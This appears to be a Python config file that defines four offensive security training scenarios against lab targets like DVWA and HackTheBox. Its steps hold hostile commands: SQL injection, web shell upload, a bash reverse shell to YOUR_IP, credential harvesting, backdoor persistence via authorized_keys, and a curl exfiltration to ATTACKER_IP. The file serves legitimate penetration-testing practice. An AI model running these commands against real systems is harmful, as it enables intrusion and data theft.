"""
Practice Scenario Definitions
Structured exercises for skill development
"""

SCENARIO_DEFINITIONS = {
    'scenario_1_web_app': {
        'name': 'Scenario 1: Web Application Compromise',
        'target': 'DVWA',
        'difficulty': 'Beginner',
        'estimated_time': '1-2 hours',
        'description': 'Learn to compromise a vulnerable web application from reconnaissance to shell access.',
        'objectives': [
            'Enumerate the web application',
            'Find and exploit SQL injection vulnerability',
            'Upload a web shell through file upload',
            'Establish a reverse shell connection',
            'Perform basic system enumeration'
        ],
        'prerequisites': [
            'DVWA Docker container running',
            'Basic understanding of HTTP',
            'Familiarity with command line'
        ],
        'steps': [
            {
                'step': 1,
                'task': 'Run technology fingerprinting',
                'command': 'python3 01-reconnaissance/tech_fingerprinter.py http://localhost',
                'expected_output': 'Web server, PHP version, and technology stack',
                'hint': 'Look for PHP version and web server details that might indicate vulnerabilities'
            },
            {
                'step': 2,
                'task': 'Run vulnerability scanner',
                'command': 'python3 04-exploitation/vulnerability_scanner.py http://localhost',
                'expected_output': 'List of potential vulnerabilities including SQL injection',
                'hint': 'Focus on SQL injection findings and note which pages are vulnerable'
            },
            {
                'step': 3,
                'task': 'Exploit SQL injection',
                'command': 'sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=..." --dbs',
                'expected_output': 'Database names',
                'hint': 'Try manual injection first: \' OR \'1\'=\'1, then use automated tools'
            },
            {
                'step': 4,
                'task': 'Upload web shell',
                'command': 'python3 04-exploitation/webshell_uploader.py http://localhost /vulnerabilities/upload/',
                'expected_output': 'Successfully uploaded web shell and access URL',
                'hint': 'Try double extension bypass (shell.php.jpg) or MIME type manipulation',
                'notes': 'DVWA may require lowering security level for file upload'
            },
            {
                'step': 5,
                'task': 'Establish reverse shell',
                'command': 'python3 04-exploitation/reverse_shell_handler.py --lhost YOUR_IP --lport 4444',
                'expected_output': 'Interactive shell on target system',
                'hint': 'Use bash reverse shell: bash -i >& /dev/tcp/YOUR_IP/4444 0>&1',
                'notes': 'Start listener first, then execute from web shell'
            },
            {
                'step': 6,
                'task': 'Enumerate system',
                'command': 'python3 05-post-exploitation/situational_awareness.py --quick',
                'expected_output': 'System information, users, running processes',
                'hint': 'Look for interesting files, database credentials, and privilege escalation paths'
            }
        ],
        'success_criteria': 'Obtain interactive shell on DVWA system and identify at least 3 interesting findings',
        'resources': [
            'DVWA Guide: https://github.com/digininja/DVWA',
            'SQL Injection: https://portswigger.net/web-security/sql-injection',
            'Web Shells: https://www.offensive-security.com/metasploit-unleashed/web-shells/'
        ],
        'footer': 'Complete this scenario to practice basic web application attack chain'
    },
    
    'scenario_2_network_pivot': {
        'name': 'Scenario 2: Network Pivoting',
        'target': 'Multi-VM Setup',
        'difficulty': 'Intermediate',
        'estimated_time': '2-4 hours',
        'description': 'Practice lateral movement by compromising multiple systems in a network.',
        'objectives': [
            'Compromise initial system',
            'Discover internal network topology',
            'Harvest credentials from first system',
            'Pivot to second system using found credentials',
            'Maintain persistent access to both systems'
        ],
        'prerequisites': [
            'Two vulnerable VMs in same network',
            'Initial VM has connectivity to second VM',
            'Basic networking knowledge'
        ],
        'steps': [
            {
                'step': 1,
                'task': 'Compromise first system',
                'command': 'Use any exploitation method from Scenario 1',
                'expected_output': 'Shell access to first target',
                'hint': 'Start with vulnerable web app or weak SSH credentials'
            },
            {
                'step': 2,
                'task': 'Stabilize and enumerate',
                'command': 'python3 05-post-exploitation/situational_awareness.py --full',
                'expected_output': 'Complete system information including network configuration',
                'hint': 'Focus on network interfaces, routing table, and ARP cache'
            },
            {
                'step': 3,
                'task': 'Discover internal network',
                'command': 'python3 05-post-exploitation/network_discovery.py',
                'expected_output': 'Live hosts on internal network',
                'hint': 'Look for systems not accessible externally, note their IP addresses and open ports'
            },
            {
                'step': 4,
                'task': 'Harvest credentials',
                'command': 'python3 05-post-exploitation/credential_harvester.py --full',
                'expected_output': 'Passwords, SSH keys, configuration files with credentials',
                'hint': 'Check SSH keys in ~/.ssh/, bash history, config files in /etc/ and home directories'
            },
            {
                'step': 5,
                'task': 'Access second system',
                'command': 'ssh -i stolen_key user@INTERNAL_IP',
                'expected_output': 'Shell access to second target',
                'hint': 'Test credential reuse with found passwords, try SSH keys for passwordless access',
                'notes': 'You may need to set up SSH tunneling through first system'
            },
            {
                'step': 6,
                'task': 'Establish persistence on both',
                'command': 'Create backdoor accounts or add SSH keys',
                'expected_output': 'Persistent access mechanism',
                'hint': 'Add your SSH key to ~/.ssh/authorized_keys on both systems'
            }
        ],
        'success_criteria': 'Access to multiple systems with documented network map and credential list',
        'resources': [
            'SSH Tunneling: https://www.ssh.com/academy/ssh/tunneling',
            'Pivoting Techniques: https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding',
            'Credential Harvesting: https://attack.mitre.org/tactics/TA0006/'
        ]
    },
    
    'scenario_3_data_theft': {
        'name': 'Scenario 3: Data Exfiltration',
        'target': 'Any Vulnerable VM',
        'difficulty': 'Intermediate',
        'estimated_time': '2-3 hours',
        'description': 'Practice identifying, collecting, and exfiltrating sensitive data covertly.',
        'objectives': [
            'Gain system access',
            'Locate sensitive data (documents, databases, credentials)',
            'Stage data for exfiltration',
            'Exfiltrate data without triggering alerts',
            'Verify data integrity post-exfiltration'
        ],
        'prerequisites': [
            'Shell access to target system',
            'Understanding of file systems',
            'Basic encryption knowledge'
        ],
        'steps': [
            {
                'step': 1,
                'task': 'Compromise target',
                'command': 'Use techniques from previous scenarios',
                'expected_output': 'Shell access',
                'hint': 'Web exploitation or credential abuse work well'
            },
            {
                'step': 2,
                'task': 'Find interesting files',
                'command': 'python3 05-post-exploitation/data_exfiltrator.py --find',
                'expected_output': 'List of sensitive files and their locations',
                'hint': 'Look for *.docx, *.xlsx, *.pdf, *.db, database dumps, configuration files with credentials'
            },
            {
                'step': 3,
                'task': 'Stage data for exfiltration',
                'command': 'python3 05-post-exploitation/data_exfiltrator.py --stage /path/to/files --compress --encrypt',
                'expected_output': 'Compressed and encrypted archive ready for transfer',
                'hint': 'Always compress to reduce size and encrypt for confidentiality'
            },
            {
                'step': 4,
                'task': 'Setup exfiltration server',
                'command': 'python3 05-post-exploitation/data_exfiltrator.py --create-server --port 8000',
                'expected_output': 'HTTP server listening for file uploads',
                'hint': 'Run this on your attacking machine to receive the data'
            },
            {
                'step': 5,
                'task': 'Exfiltrate data',
                'command': 'curl -X POST -F "file=@/tmp/exfil.tar.gz.enc" http://ATTACKER_IP:8000/upload',
                'expected_output': 'Successful upload confirmation',
                'hint': 'For covert exfiltration, consider DNS tunneling or ICMP tunneling'
            },
            {
                'step': 6,
                'task': 'Verify and decrypt',
                'command': 'python3 05-post-exploitation/data_exfiltrator.py --decrypt exfil.tar.gz.enc',
                'expected_output': 'Successfully decrypted archive with all files intact',
                'hint': 'Verify checksums to ensure data integrity'
            }
        ],
        'success_criteria': 'Successfully exfiltrated and verified at least 5 sensitive files',
        'resources': [
            'Data Exfiltration: https://attack.mitre.org/tactics/TA0010/',
            'Covert Channels: https://www.hackingarticles.in/data-exfiltration-techniques/',
            'Encryption Basics: https://www.ssl.com/article/what-is-encryption/'
        ]
    },
    
    'scenario_4_full_chain': {
        'name': 'Scenario 4: Complete Attack Chain',
        'target': 'HackTheBox or TryHackMe Machine',
        'difficulty': 'Advanced',
        'estimated_time': '4-8 hours',
        'description': 'Execute a complete attack chain from external reconnaissance to root access.',
        'objectives': [
            'External reconnaissance without prior knowledge',
            'Identify and exploit vulnerability for initial access',
            'Establish persistence mechanism',
            'Escalate privileges to root/SYSTEM',
            'Document complete attack path with timestamps',
            'Create professional penetration test report'
        ],
        'prerequisites': [
            'HackTheBox or TryHackMe account',
            'VPN connection to lab network',
            'All previous scenarios completed'
        ],
        'steps': [
            {
                'step': 1,
                'task': 'Comprehensive reconnaissance',
                'command': 'python3 01-reconnaissance/master_recon.py TARGET_IP "Target Name"',
                'expected_output': 'Complete reconnaissance report with services, technologies, and potential attack vectors',
                'hint': 'Document everything - you never know what will be useful. Save all command outputs.'
            },
            {
                'step': 2,
                'task': 'Vulnerability identification',
                'command': 'Analyze reconnaissance results and research identified services',
                'expected_output': 'List of potential vulnerabilities ranked by exploitability',
                'hint': 'Look for outdated software versions, misconfigurations, default credentials. Use searchsploit and Google.'
            },
            {
                'step': 3,
                'task': 'Exploitation for initial access',
                'command': 'Execute exploit (custom or existing)',
                'expected_output': 'Initial shell access (may be limited user)',
                'hint': 'May require custom exploit development or chaining multiple vulnerabilities',
                'notes': 'Document exact steps taken and commands used'
            },
            {
                'step': 4,
                'task': 'Post-exploitation enumeration',
                'command': 'python3 05-post-exploitation/situational_awareness.py --full && python3 05-post-exploitation/credential_harvester.py',
                'expected_output': 'Complete system information and any found credentials',
                'hint': 'Look for privilege escalation vectors: SUID binaries, sudo rights, kernel version, cron jobs'
            },
            {
                'step': 5,
                'task': 'Privilege escalation',
                'command': 'Exploit identified privilege escalation vector',
                'expected_output': 'Root or SYSTEM shell',
                'hint': 'Check sudo -l, find / -perm -4000 2>/dev/null, check kernel exploits, review running services',
                'notes': 'Document the escalation path clearly'
            },
            {
                'step': 6,
                'task': 'Establish persistence',
                'command': 'Add SSH key or create backdoor account',
                'expected_output': 'Reliable re-access method',
                'hint': 'echo "YOUR_SSH_KEY" >> /root/.ssh/authorized_keys (for practice only)',
                'notes': 'In real engagements, coordinate with client before persistence'
            },
            {
                'step': 7,
                'task': 'Collect proof and clean up',
                'command': 'Capture screenshots, retrieve flags, document findings',
                'expected_output': 'Complete evidence package',
                'hint': 'Screenshots of: initial access, user flag, root flag, privilege escalation method'
            },
            {
                'step': 8,
                'task': 'Create attack path documentation',
                'command': 'Document every step from recon to root with timestamps',
                'expected_output': 'Professional report suitable for client presentation',
                'hint': 'Include: executive summary, detailed timeline, vulnerability descriptions, remediation recommendations'
            }
        ],
        'success_criteria': 'Root/SYSTEM access with complete professional documentation including attack timeline and remediation advice',
        'resources': [
            'HTB Walkthrough Template: https://github.com/Hackplayers/hackthebox-writeups',
            'Privilege Escalation: https://book.hacktricks.xyz/linux-hardening/privilege-escalation',
            'Report Writing: https://github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report'
        ]
    }
}